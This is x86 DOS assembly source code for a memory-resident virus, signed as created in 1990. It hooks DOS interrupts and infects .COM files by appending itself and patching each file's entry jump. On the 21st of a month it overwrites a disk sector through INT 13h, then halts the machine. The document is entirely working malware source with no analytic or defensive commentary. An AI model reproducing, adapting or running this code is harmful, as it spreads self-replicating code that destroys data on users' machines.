start:  jmp     short begin
	db	(00h)
	db	(53h)
	db	(4bh)
	int	20h
okey:	db	(0b8h)
	db	(03h)
	db	(00h)
	db	(0cdh)
	db	(10h)
begin:	push	cx
	CALL	F1
F1:	POP	SI
	SUB	SI,09
	push	cs
	pop	ds
	push	cs
	pop	es
        MOV     WORD PTR [LenF],SI
	cld
	mov	di,100h
	mov	cx,5
	rep	movsb
	jmp	ding1
int21h: STI
        cmp     ah,00
	jz	int20h
	cmp	ah,4ch
	jz	int20h
et1:    db      (0eah)
is:	dw	0
io:	dw	0

;int13h: sti
;        PUSH    BX
;        PUSH    CX
;        PUSH    DX
;        PUSH    DS
;        PUSH    ES
;        PUSH    SI
;        PUSH    DI
;        push    ax
;        push    ds
;        cmp     ah,03
;        jz      etk2
;        cmp     ah,05
;        jnz     etk3
;etk2:   mov     ax,0000
;        mov     ds,ax
;        inc     Word ptr [310h]
;        cmp     Word ptr [310h],0FFEh
;        jnz     etk3
;        push    cs
;        pop     ds
;        int     20h
;etk3:   pop     ds
;        pop     ax
;        int     65h
;        cld
;        mov     ax,0
;        POP     DI
;        POP     SI
;        POP     ES
;        POP     DS
;        POP     DX
;        POP     CX
;        POP     BX
;        iret
int20h: STI
        PUSH    AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DS
	PUSH	ES
	PUSH	SI
	PUSH	DI
	mov	ah,2ah
	int	21h
	cmp	dl,21
	jnz	okef
	mov	ax,0309h
	mov	dx,0000h
	mov	cx,0001h
	lea	bx,[100h]
	int	13h
	jmp	short okep
okef:   mov     ax,0
	mov	ds,ax
	inc	word ptr [310h]
	cmp	Word ptr [310h],0FFFh
	jnz	oke
okep:	push	cs
	pop	ds
	mov	ah,9
	mov	di,name-okey
	add	di,107h
	mov	dx,di
	int	21h
	cli
	hlt
oke:	mov	ax,0
	mov	ds,ax
	cmp	byte ptr [302h],0
	jz	et3
	mov	byte ptr [302h],0
	jmp	main
dinge:	jmp	ding
et3:	push	cs		;ds <- cs
	pop	ds
	mov	ah,2fh		;Dos service function ah=2FH (get DTA)
	int	21h		;ES:BX Addres of current DTA
	mov	di,edta-okey
	add	di,107h
	mov	[di],ES
	mov	[di+2],BX
	mov	ah,1ah		;Dos service function ah=1AH (set DTA)
        PUSH    CS
        POP     DS
	mov	dx,dta-okey	;DS:DX Addres of DTA
        add     dx,107h
	int	21h
	push	cs
	pop	ds
        MOV     AH,4eH
        MOV     DX,files-okey
        ADD     dx,107h
	mov	cx,00
        INT     21H             ;Dos service function ah=4EH (FIND FIRST)
        jc      dinge           ;CX  File attribute
                                ;DS:DX Pointer of filespec (ASCIIZ string)
vir:	mov	ax,3d02h
	push	cs
	pop	ds
	mov	dx,dta-okey	;DS:DX Addres of DTA
        add     dx,107h
	add	dx,1EH
	int	21h		;Dos service function ah=3DH (OPEN FILE)
                                ;AL Open mode
                                ;DS:DX Pointer to filename (ASCIIZ string)
                                ;Return AX file handle
	mov	di,handle-okey
	add	di,107h
        mov     [di],ax
	mov	ah,'C'
	mov	al,'D'
        PUSH    DX
        POP     BX
	cmp	[bx],ah ;Compare filename for 'COMMAND.COM'
	jnz	p1		;If not first char 'C' then push virus in file
	cmp	[bx+6],al
	jz	v		;If 7 char 'D' then find next file
p1:	mov	di,handle-okey
	add	di,107h
	mov	bx,[di]
        push    cs
	pop	ds
	mov	ah,3fh
	mov	dx,end-okey
        add     dx,107h
	mov	cx,5
	int	21h		;Dos service function ah=3FH (READ FILE)
                                ;BX File handle
                                ;CX Number of bytes to read
                                ;DS:DX Addres of buffer
	push	cs
	pop	es		;ES <- CS
	cld
        PUSH    DX
        POP     SI
	mov	di,107h
	mov	cx,5
	rep	movsb		;Repeat While CX>0 do ES:DI <- DS:SI
                                ;                     SI=SI+1
                                ;                     DI=DI+1
	mov	ax,534bh
	mov	di,dx
	add	di,3
	cmp	[di],ah
	jnz	fuck
	inc	di
	cmp	[di],al
	jnz	fuck
v:	push	cs
	pop	ds
	mov	di,handle-okey
	add	di,107h
	mov	bx,[di]
	mov	ah,3eh
	int	21h
	push	cs
	pop	ds
	mov	ah,4fh
	int	21h
	jc	enzi
	jmp	short vir
enzi:	jmp	ding
fuck:   mov     ax,dta-okey
        add     ax,107h
	add	ax,1aH
	mov	di,ax
        Mov     Word Ptr cx,[di]
        mov     ax,end-okey
        add     ax,107h
	mov	di,ax
	mov	al,0e9h
	cmp	cx,0feh
	jna	v
	add	cx,2
	mov	[di],al
	inc	di
	mov	Word Ptr [di],cx
	mov	ax,534bh
	add	di,2
	mov	[di],ah
	inc	di
	mov	[di],al
	mov	di,handle-okey
	add	di,107h
	mov	bx,[di]
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	push	cs
	pop	ds
	int	21h
	mov	di,handle-okey
	add	di,107h
	mov	bx,[di]
	mov	ah,40h
	mov	dx,end-okey
	add	dx,107h
	mov	cx,5
	int	21h
	mov	ax,4202h
	xor	cx,cx
	xor	dx,dx
	int	21h
	push	cs
	pop	ds
	mov	di,handle-okey
	add	di,107h
	mov	bx,[di]
	mov	ah,40h
	mov	dx,107h
	mov	cx,end-okey
	int	21h
        mov     ah,3eh
	int	21h
	mov	ax,0000
	mov	ds,ax
	inc	Word ptr [0310h]
	push	cs
	pop	ds
ding:	mov	ah,1ah
	mov	di,edta-okey
	add	di,107h
	mov	ds,[di]
	mov	dx,[di+2]
	int	21h
main:	PUSH	CS
	POP	DS
	POP	DI
	POP	SI
        POP     ES
	POP	DS
	POP	DX
	POP	CX
	POP	BX
	POP	AX
int1h:	DB	(0EAH)
INTSH:	DW	(0)
INTOH:	DW	(0)
name:	db	'Virus in memory !!! Created by 21.I.1990 - PMG\OTME - Tolbuhin ...$'
for1:	jmp	for
files:	db	'*.com',0
Ding1:  mov     ax,0000h
	mov	ds,ax
	mov	byte ptr [302h],1
	cmp	word ptr [300h],4B53h
	jz	for1
        mov     word ptr [300h],4B53h
        mov     ah,62h
	int	21h
	mov	ds,bx
	mov	bx,[2ch]
	dec	bx
	mov	dx,0FFFFh
loc_1:	mov	ds,bx
	mov	di,[3]
	inc	di
	add	dx,di
	add	bx,di
	cmp	byte ptr [0000],5Ah
	jne	loc_1
	mov	cx,es
	add	cx,dx
	sub	word ptr [3],80h
	sub	cx,80h
	sub	cx,10h
	mov	es,cx
	mov	di,100h
	cld
	PUSH	DI
        mov     ax,0000h
        mov     ds,ax
;        mov     bx,[004ch]
;        mov     [0194h],bx
;        mov     cx,[004eh]
;        mov     [0196h],cx
        mov     bx,[0080h]
	mov	cx,[0082h]
        PUSH    CS
	POP	DS
	mov	di,intsh-okey
	add	di,[lenf]
	mov	[di],bx
	mov	[di+2],cx
        mov     ax,0000h
	mov	ds,ax
	mov	bx,[0084h]
	mov	cx,[0086h]
        PUSH    CS
	POP	DS
	mov	di,is-okey
	add	di,[lenf]
	mov	[di],bx
	mov	[di+2],cx
	push	cs
	pop	ds
	POP	DI
	mov	si,[lenf]
	sub	si,7
	mov	cx,800h
        push    cs
        pop     ds
	rep	movsb
	mov	ax,0000
	mov	ds,ax
	mov	WORD PTR [0082h],es
	mov	WORD PTR [0086h],es
;        mov     WORD PTR [004eh],es
;        mov     di,int13h-okey
;        add     di,107h
;        mov     WORD PTR [004ch],di
        mov     di,int20h-okey
        add     di,107h
	mov	WORD PTR [0080h],di
        mov     di,int21h-okey
        add     di,107h
	mov	WORD PTR [0084h],di
	jmp	ding3
for:	mov	ax,0
	mov	ds,ax
	mov	bx,[80h]
	mov	cx,[82h]
	push	cx
	pop	ds
	push	cx
	mov	di,intsh-okey
	add	di,107h
	mov	bx,[di]
	mov	cx,[di+2]
	push	cs
	pop	ds
	mov	di,v20h1-okey
	add	di,[lenf]
	mov	[di],bx
	mov	[di+2],cx
        mov     ax,0000h
	mov	ds,ax
        mov     Byte ptr [302h],0
        pop     ds
        mov     di,INTSH-okey
        add     di,107h
        mov     bx,ding2-okey
        add     bx,[lenf]
        mov     word ptr [di],bx
        mov     word ptr [di+2],CS
	int	20h
ding2:	push	cs
	pop	ds
	mov	di,v20h1-okey
	add	di,[lenf]
	mov	bx,[di]
	mov	cx,[di+2]
	mov	ax,0
	mov	ds,ax
	mov	WORD PTR ax,[82h]
	mov	word ptr [302h],1
	mov	ds,ax
	mov	di,intsh-okey
	add	di,107h
	mov	[di],bx
	mov	[di+2],cx
ding3:	PUSH	CS
	POP	DS
	push	cs
	pop	es
	pop	cx
	mov	si,100h
	jmp	si
LenF:   dw      ?
dta:	db	256	dup (?)
handle: dw	?
edta:	dw	?
bdta:	dw	?
v20h1:	dw	?
v20h2:	dw	?
com:    db      'COMMAND'
end:    db      (00)
